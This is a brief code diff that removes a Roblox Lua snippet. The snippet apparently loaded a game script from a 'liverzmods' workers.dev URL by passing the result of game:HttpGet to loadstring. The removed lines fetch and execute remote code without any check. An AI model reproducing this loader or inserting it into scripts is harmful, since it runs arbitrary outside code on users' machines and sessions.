@@ -1,4 +1,0 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://piggy.liverzmods.workers.dev"))();
-    warn("get the new link to the script")
-end)
